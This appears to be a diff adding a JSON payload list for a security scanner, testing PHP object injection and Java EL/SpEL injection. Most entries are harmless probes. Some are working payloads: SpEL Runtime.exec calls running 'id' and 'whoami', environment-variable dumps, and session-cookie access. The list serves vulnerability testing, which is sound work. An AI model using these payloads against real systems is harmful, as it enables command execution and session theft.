@@ -1,0 +1,152 @@
+[
+  {
+    "id": "obj-001", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "O:8:\"stdClass\":0:{}", "context": "string",
+    "description": "PHP object deserialization probe — stdClass",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-002", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "a:2:{i:0;s:4:\"test\";i:1;s:5:\"probe\";}", "context": "string",
+    "description": "PHP serialized array probe",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-003", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "O:4:\"Evil\":1:{s:4:\"data\";s:10:\"OBJ_INJECT\";}", "context": "string",
+    "description": "PHP object with custom class — triggers __wakeup/__destruct",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-004", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "O:7:\"MyClass\":2:{s:3:\"cmd\";s:2:\"id\";s:4:\"data\";s:4:\"test\";}", "context": "string",
+    "description": "PHP object injection with command property",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-005", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "TzozOiJGb28iOjE6e3M6MzoiYmFyIjtzOjc6ImNvbW1hbmQiO30=", "context": "string",
+    "description": "Base64 encoded PHP serialized object",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-006", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${7*7}", "context": "template",
+    "description": "EL injection — arithmetic evaluation probe (expects 49)",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Server-Side_Template_Injection"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-007", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${applicationScope}", "context": "template",
+    "description": "EL injection — dump application scope",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-008", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${param.test}", "context": "template",
+    "description": "EL injection — parameter access probe",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-009", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${header['host']}", "context": "template",
+    "description": "EL injection — header access probe",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-010", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "#{7*7}", "context": "template",
+    "description": "JSF EL injection probe (alternative syntax)",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-011", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${T(java.lang.System).getenv()}", "context": "template",
+    "description": "EL injection — JVM environment variable enumeration",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-012", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${facesContext.externalContext.request.remoteAddr}", "context": "template",
+    "description": "JSF EL injection — access FacesContext",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-013", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{T(java.lang.Runtime).getRuntime().exec('id')}", "context": "template",
+    "description": "SpEL injection — OS command execution",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-014", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{T(java.lang.Math).random()}", "context": "template",
+    "description": "SpEL injection — safe method call probe",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-015", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{2*3*7}", "context": "template",
+    "description": "SpEL injection — arithmetic probe (expects 42)",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-016", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{T(java.lang.System).getProperty('os.name')}", "context": "template",
+    "description": "SpEL injection — OS name enumeration",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-017", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\\\A').next()}", "context": "template",
+    "description": "SpEL injection — command execution with output capture",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-018", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}", "context": "template",
+    "description": "SpEL injection — command output via IOUtils",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-019", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "O:3:\"PDO\":0:{}", "context": "string",
+    "description": "PHP PDO object injection probe",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-020", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${env.PATH}", "context": "template",
+    "description": "EL injection — PATH environment variable access",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-021", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${cookie.JSESSIONID.value}", "context": "template",
+    "description": "EL injection — session cookie exfiltration",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-022", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "C:11:\"ArrayObject\":37:{x:i:0;a:2:{i:0;s:4:\"test\";i:1;s:5:\"probe\";}}", "context": "string",
+    "description": "PHP ArrayObject serialization probe",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "obj-023", "family": "object_injection", "subtype": "spel_injection",
+    "payload_string": "#{T(java.net.InetAddress).getLocalHost().getHostName()}", "context": "template",
+    "description": "SpEL injection — hostname disclosure",
+    "references": ["https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-024", "family": "object_injection", "subtype": "el_injection",
+    "payload_string": "${request.getServletContext().getServerInfo()}", "context": "template",
+    "description": "EL injection — server info disclosure",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "obj-025", "family": "object_injection", "subtype": "php_object",
+    "payload_string": "s:11:\"OBJ_INJECT!\";", "context": "string",
+    "description": "PHP serialized string marker for reflection detection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"], "platform_specific": {"php": true}
+  }
+]
